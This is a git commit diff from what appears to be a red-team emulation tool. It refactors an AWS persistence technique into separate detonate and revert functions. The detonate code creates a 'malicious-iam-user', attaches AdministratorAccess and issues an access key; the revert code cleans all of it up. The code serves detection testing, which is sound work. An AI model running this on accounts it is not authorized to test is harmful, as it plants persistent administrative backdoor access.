8d45c774658db263c978b63427f99b2dddaa67f8
Christophe Tafani-Dereeper <christophe.tafanidereeper@datadoghq.com>
2022-01-26 12:23:41 +0100

    Ensure all attack techniques have dedicated detonate/revert functions

--- internal/attacktechniques/aws/persistence/iam-user-create-new/main.go
+++ internal/attacktechniques/aws/persistence/iam-user-create-new/main.go
@@ -13,10 +13,10 @@ import (
 	"log"
 )
 
-func init() {
-	var userName = aws.String("malicious-iam-user")
-	var adminPolicyArn = aws.String("arn:aws:iam::aws:policy/AdministratorAccess")
+var userName = aws.String("malicious-iam-user")
+var adminPolicyArn = aws.String("arn:aws:iam::aws:policy/AdministratorAccess")
 
+func init() {
 	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
 		ID:           "aws.persistence.malicious-iam-user",
 		FriendlyName: "Create an administrative IAM User",
@@ -32,71 +32,79 @@ Detonation:
 		Platform:           stratus.AWS,
 		IsIdempotent:       false, // cannot create twice an IAM user with the same name
 		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
-		Detonate: func(params map[string]string) error {
-			iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
-			log.Println("Creating a malicious IAM user")
-			_, err := iamClient.CreateUser(context.Background(), &iam.CreateUserInput{
-				UserName: userName,
-				Tags: []types.Tag{
-					{Key: aws.String("StratusRedTeam"), Value: aws.String("true")},
-				},
-			})
-			if err != nil {
-				return err
-			}
+		Detonate:           detonate,
+		Revert:             revert,
+	})
+}
 
-			log.Println("Attaching an administrative IAM policy to the malicious IAM user")
-			_, err = iamClient.AttachUserPolicy(context.Background(), &iam.AttachUserPolicyInput{
-				UserName:  userName,
-				PolicyArn: adminPolicyArn,
-			})
-			if err != nil {
-				return err
-			}
+func detonate(map[string]string) error {
+	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
 
-			log.Println("Creating an access key for the IAM user")
-			result, err := iamClient.CreateAccessKey(context.Background(), &iam.CreateAccessKeyInput{
-				UserName: userName,
-			})
-			if err != nil {
-				return err
-			}
-			log.Println("Created access key " + *result.AccessKey.AccessKeyId)
-
-			return nil
-		},
-		Revert: func(params map[string]string) error {
-			iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
-			result, err := iamClient.ListAccessKeys(context.Background(), &iam.ListAccessKeysInput{
-				UserName: userName,
-			})
-			if err != nil {
-				return errors.New("unable to clean up IAM user access keys: " + err.Error())
-			}
-			for i := range result.AccessKeyMetadata {
-				accessKeyId := result.AccessKeyMetadata[i].AccessKeyId
-				_, err := iamClient.DeleteAccessKey(context.Background(), &iam.DeleteAccessKeyInput{
-					UserName:    userName,
-					AccessKeyId: accessKeyId,
-				})
-				if err != nil {
-					return errors.New("unable to remove IAM user access key " + *accessKeyId + ": " + err.Error())
-				}
-				log.Println("Removed access key " + *accessKeyId)
-			}
-
-			log.Println("Detaching administrative policy")
-			_, err = iamClient.DetachUserPolicy(context.Background(), &iam.DetachUserPolicyInput{
-				UserName:  userName,
-				PolicyArn: adminPolicyArn,
-			})
-			if err != nil {
-				return err
-			}
-
-			log.Println("Removing IAM user")
-			_, err = iamClient.DeleteUser(context.Background(), &iam.DeleteUserInput{UserName: userName})
-			return err
+	log.Println("Creating a malicious IAM user")
+	_, err := iamClient.CreateUser(context.Background(), &iam.CreateUserInput{
+		UserName: userName,
+		Tags: []types.Tag{
+			{Key: aws.String("StratusRedTeam"), Value: aws.String("true")},
 		},
 	})
+	if err != nil {
+		return err
+	}
+
+	log.Println("Attaching an administrative IAM policy to the malicious IAM user")
+	_, err = iamClient.AttachUserPolicy(context.Background(), &iam.AttachUserPolicyInput{
+		UserName:  userName,
+		PolicyArn: adminPolicyArn,
+	})
+	if err != nil {
+		return err
+	}
+
+	log.Println("Creating an access key for the IAM user")
+	result, err := iamClient.CreateAccessKey(context.Background(), &iam.CreateAccessKeyInput{
+		UserName: userName,
+	})
+	if err != nil {
+		return err
+	}
+
+	log.Println("Created access key " + *result.AccessKey.AccessKeyId)
+
+	return nil
+}
+
+func revert(map[string]string) error {
+	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
+
+	result, err := iamClient.ListAccessKeys(context.Background(), &iam.ListAccessKeysInput{
+		UserName: userName,
+	})
+	if err != nil {
+		return errors.New("unable to clean up IAM user access keys: " + err.Error())
+	}
+	
+	for i := range result.AccessKeyMetadata {
+		accessKeyId := result.AccessKeyMetadata[i].AccessKeyId
+		_, err := iamClient.DeleteAccessKey(context.Background(), &iam.DeleteAccessKeyInput{
+			UserName:    userName,
+			AccessKeyId: accessKeyId,
+		})
+		if err != nil {
+			return errors.New("unable to remove IAM user access key " + *accessKeyId + ": " + err.Error())
+		}
+		log.Println("Removed access key " + *accessKeyId)
+	}
+
+	log.Println("Detaching administrative policy")
+	_, err = iamClient.DetachUserPolicy(context.Background(), &iam.DetachUserPolicyInput{
+		UserName:  userName,
+		PolicyArn: adminPolicyArn,
+	})
+	if err != nil {
+		return err
+	}
+
+	log.Println("Removing IAM user")
+	_, err = iamClient.DeleteUser(context.Background(), &iam.DeleteUserInput{UserName: userName})
+	return err
 }
